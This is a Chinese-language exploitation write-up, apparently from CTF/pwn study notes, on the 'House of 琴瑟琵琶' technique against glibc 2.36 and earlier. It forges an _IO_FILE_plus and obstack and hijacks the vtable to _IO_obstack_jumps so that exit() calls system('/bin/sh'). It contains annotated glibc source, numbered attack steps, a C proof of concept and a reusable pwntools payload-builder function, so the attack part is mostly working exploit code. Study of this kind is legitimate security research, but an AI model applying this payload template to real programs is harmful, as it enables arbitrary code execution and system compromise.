- [House of 琴瑟琵琶](#house-of-琴瑟琵琶)
  - [基础结构体](#基础结构体)
    - [\_IO\_obstack\_jumps](#_io_obstack_jumps)
    - [obstack](#obstack)
    - [\_IO\_obstack\_file](#_io_obstack_file)
  - [原理](#原理)
  - [攻击](#攻击)
  - [示例](#示例)
  - [攻击模板](#攻击模板)

# House of 琴瑟琵琶

__利用版本:__

glibc 2.36及其之前

## 基础结构体

### _IO_obstack_jumps

_IO_obstack_jumps通常在_IO_file_jumps上方，只有两个函数指针被初始化，特征比较明显

```C
// 只初始化了两个函数指针
const struct _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden =
{
    JUMP_INIT_DUMMY,    // 2
    JUMP_INIT(finish, NULL),
    JUMP_INIT(overflow, _IO_obstack_overflow),
    JUMP_INIT(underflow, NULL),
    JUMP_INIT(uflow, NULL),
    JUMP_INIT(pbackfail, NULL),
    JUMP_INIT(xsputn, _IO_obstack_xsputn),
    JUMP_INIT(xsgetn, NULL),
    JUMP_INIT(seekoff, NULL),
    JUMP_INIT(seekpos, NULL),
    JUMP_INIT(setbuf, NULL),
    JUMP_INIT(sync, NULL),
    JUMP_INIT(doallocate, NULL),
    JUMP_INIT(read, NULL),
    JUMP_INIT(write, NULL),
    JUMP_INIT(seek, NULL),
    JUMP_INIT(close, NULL),
    JUMP_INIT(stat, NULL),
    JUMP_INIT(showmanyc, NULL),
    JUMP_INIT(imbue, NULL)
};
```

### obstack

```C
struct obstack // size = 0x58
{
    long chunk_size;              // 偏移:0x0  大小:0x8
    struct _obstack_chunk *chunk; // 偏移:0x8  大小:0x8
    char *object_base;            // 偏移:0x10 大小:0x8
    char *next_free;              // 偏移:0x18 大小:0x8
    char *chunk_limit;            // 偏移:0x20 大小:0x8
    union
    {
        PTR_INT_TYPE tempint; // 偏移:0x28 大小:0x8
        void *tempptr;        // 偏移:0x28 大小:0x8
    } temp;                   // 偏移:0x28 大小:0x8

    int alignment_mask;                               // 偏移:0x30 大小:0x4
    struct _obstack_chunk *(*chunkfun)(void *, long); // 偏移:0x38 大小:0x8
    void (*freefun)(void *, struct _obstack_chunk *); // 偏移:0x40 大小:0x8
    void *extra_arg;                                  // 偏移:0x48 大小:0x8
    unsigned use_extra_arg : 1;
    unsigned maybe_empty_object : 1;
    unsigned alloc_failed : 1;
};
```

### _IO_obstack_file

```C
struct _IO_obstack_file         // size = 0xE8
{
    struct _IO_FILE_plus file;  // size = 0xE0
    struct obstack *obstack;    // size(*obstack) = 0x58
};
```

## 原理

劫持 `vtable` 为 `_IO_obstack_jumps` , 然后通过 `_IO_obstack_xsputn` 来触发漏洞

```C
static size_t
_IO_obstack_xsputn(FILE *fp, const void *data, size_t n)
{
    struct obstack *obstack = ((struct _IO_obstack_file *)fp)->obstack;

    // _IO_write_ptr设置为1, _IO_write_end设置为0
    if (fp->_IO_write_ptr + n > fp->_IO_write_end)
    {
        int size;

        obstack_blank_fast(obstack, fp->_IO_write_ptr - fp->_IO_write_end);
        // ((obstack)->next_free += (fp->_IO_write_ptr - fp->_IO_write_end))

        obstack_grow(obstack, data, n);
        // __extension__({
        //  struct obstack *__o = (obstack);
        //      int __len = (n);
        //      // next_free此时为1，chunk_limit设置为0
        //      if (__o->next_free + __len > __o->chunk_limit)
        //          _obstack_newchunk(__o, __len);
        //      memcpy(__o->next_free, data, __len);
        //       __o->next_free += __len;
        //      (void)0;
        // });

        fp->_IO_write_base = obstack_base(obstack);
        fp->_IO_write_ptr = obstack_next_free(obstack);
        size = obstack_room(obstack);
        fp->_IO_write_end = fp->_IO_write_ptr + size;

        obstack_blank_fast(obstack, size);
    }
    else
        fp->_IO_write_ptr = __mempcpy(fp->_IO_write_ptr, data, n);

    return n;
}
/* Allocate a new current chunk for the obstack *H
   on the assumption that LENGTH bytes need to be added
   to the current object, or a new object of length LENGTH allocated.
   Copies any partial object from the end of the old chunk
   to the beginning of the new one.  */

void _obstack_newchunk(struct obstack *h, int length)
{
    struct _obstack_chunk *old_chunk = h->chunk;
    struct _obstack_chunk *new_chunk;
    long new_size;
    long obj_size = h->next_free - h->object_base;
    long i;
    long already;
    char *object_base;

    new_size = (obj_size + length) + (obj_size >> 3) + h->alignment_mask + 100;
    if (new_size < h->chunk_size)
        new_size = h->chunk_size;

    // use_extra_arg = 1
    // extra_arg = /bin/sh地址
    // chunkfun = system地址
    new_chunk = CALL_CHUNKFUN(h, new_size);
    // #define CALL_CHUNKFUN(h, size)                      \
    //     (((h)->use_extra_arg)                           \
    //          ? (*(h)->chunkfun)((h)->extra_arg, (size)) \
    //          : (*(struct _obstack_chunk * (*)(long))(h)->chunkfun)((size)))

    if (!new_chunk)
        (*obstack_alloc_failed_handler)();
    h->chunk = new_chunk;
    new_chunk->prev = old_chunk;
    new_chunk->limit = h->chunk_limit = (char *)new_chunk + new_size;

    /* Compute an aligned object_base in the new chunk */
    object_base =
        __PTR_ALIGN((char *)new_chunk, new_chunk->contents, h->alignment_mask);

    /* Move the existing object to the new chunk.
       Word at a time is fast and is safe if the object
       is sufficiently aligned.  */
    if (h->alignment_mask + 1 >= DEFAULT_ALIGNMENT)
    {
        for (i = obj_size / sizeof(COPYING_UNIT) - 1;
             i >= 0; i--)
            ((COPYING_UNIT *)object_base)[i] = ((COPYING_UNIT *)h->object_base)[i];
        /* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,
       but that can cross a page boundary on a machine
       which does not do strict alignment for COPYING_UNITS.  */
        already = obj_size / sizeof(COPYING_UNIT) * sizeof(COPYING_UNIT);
    }
    else
        already = 0;
    /* Copy remaining bytes one by one.  */
    for (i = already; i < obj_size; i++)
        object_base[i] = h->object_base[i];

    /* If the object just copied was the only data in OLD_CHUNK,
       free that chunk and remove it from the chain.
       But not if that chunk might contain an empty object.  */
    if (!h->maybe_empty_object && (h->object_base == __PTR_ALIGN((char *)old_chunk, old_chunk->contents,
                                                                 h->alignment_mask)))
    {
        new_chunk->prev = old_chunk->prev;
        CALL_FREEFUN(h, old_chunk);
    }

    h->object_base = object_base;
    h->next_free = h->object_base + obj_size;
    /* The new chunk certainly contains no empty object yet.  */
    h->maybe_empty_object = 0;
}
```

## 攻击

1. 在一块内存中同时伪造`_IO_FILE_plus`和`obstack`
2. 设置`fake_IO_FILE_plus->_IO_write_base = 0`
3. 设置`fake_IO_FILE_plus->_IO_write_ptr = 1`
4. 设置`fake_IO_FILE_plus->_IO_write_end = 0`
5. 设置`fake_IO_FILE_plus->_mode = 0`
6. 设置`fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4`, 这是`overflow`函数的位置
7. 设置`fake_IO_obstack_file->obstack = fake_IO_FILE_plus`, 将`fake_obstack`指向`fake_IO_FILE_plus`重复利用空间
8. 设置`fake_obstack->next_free = 0`
9. 设置`fake_obstack->chunk_limit = 0`
10. 设置`fake_obstack->use_extra_arg = 1`
11. 设置`fake_obstack->extra_arg = /bin/sh`地址
12. 设置`fake_obstack->chunkfun = system`
13. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
14. `exit`时触发漏洞

## 示例

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>

char *shell = "/bin/sh";

int main()
{
    u64 _IO_obstack_jumps = GET_VALUE(stdin) - (0x21AAA0 - 0x2173C0);

    u64 fake_IO_obstack = MALLOC(0x200);

    // 伪造_IO_obstack_file
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x20, 0x0); // fake_IO_FILE_plus->_IO_write_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x28, 0x1); // fake_IO_FILE_plus->_IO_write_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x30, 0x0); // fake_IO_FILE_plus->_IO_write_end = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0xC0, 0x0); // fake_IO_FILE_plus->_mode = 0

    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0xD8, _IO_obstack_jumps + 0x8 * 4); // fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4

    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0xE0, fake_IO_obstack);    // fake_IO_obstack_file->obstack = fake_IO_obstack, 我们重复利用空间
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x18, 0x0);                // fake_obstack->next_free = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x20, 0x0);                // fake_obstack->chunk_limit = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x50, 0xFFFFFFFFFFFFFFFF); // fake_obstack->use_extra_arg = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x48, shell);              // fake_obstack->extra_arg = /bin/sh地址
    SET_ADDR_OFFSET_VALUE(fake_IO_obstack, 0x38, &system);            // fake_obstack->chunkfun = system

    // 修改chain
    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_obstack); // stdout->_IO_write_ptr = fake_IO_obstack

    // 触发漏洞
    exit(0);

    return 0; // 触发漏洞
}
```

## 攻击模板

```python
from pwn import *
from base_data import *

def HOQSPP(_IO_obstack_jumps_addr, payload_addr,  fun_addr, param = None):
    '''
        _IO_obstack_jumps_addr: _IO_obstack_jumps的实际地址
        payload_addr: payload将要写入的地址
        fun_addr: 要调用的函数的实际地址
        param: 函数的参数, 默认为内置的/bin/sh地址
    '''
    if param is None:
        param = payload_addr + 0x40
    
    payload = b''
    payload = set_value(payload, 0x18, 0x0);                                          # fake_obstack->next_free = 0
    payload = set_value(payload, 0x20, 0x0);                                          # fake_obstack->chunk_limit = 0, fake_IO_FILE_plus->_IO_write_base = 0
    payload = set_value(payload, 0x28, 0x1);                                          # fake_IO_FILE_plus->_IO_write_ptr = 1
    payload = set_value(payload, 0x30, 0x0);                                          # fake_IO_FILE_plus->_IO_write_end = 0
    payload = set_value(payload, 0x38, fun_addr);                                     # fake_obstack->chunkfun = system
    payload = set_value(payload, 0x48, param);                                        # fake_obstack->extra_arg = /bin/sh地址
    payload = set_value(payload, 0x50, 0xFFFFFFFFFFFFFFFF);                           # fake_obstack->use_extra_arg = 1
    payload = set_value(payload, 0xC0, 0x0);                                          # fake_IO_FILE_plus->_mode = 0
    payload = set_value(payload, 0xD8, _IO_obstack_jumps_addr + 0x8 * 4);             # fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4
    payload = set_value(payload, 0xE0, payload_addr);                                 # fake_IO_obstack_file->obstack = fake_IO_obstack, 我们重复利用空间
    
    payload = set_value(payload, 0x40, BINSH);                                        # 内置/bin/sh字符串值
    
    return payload
```
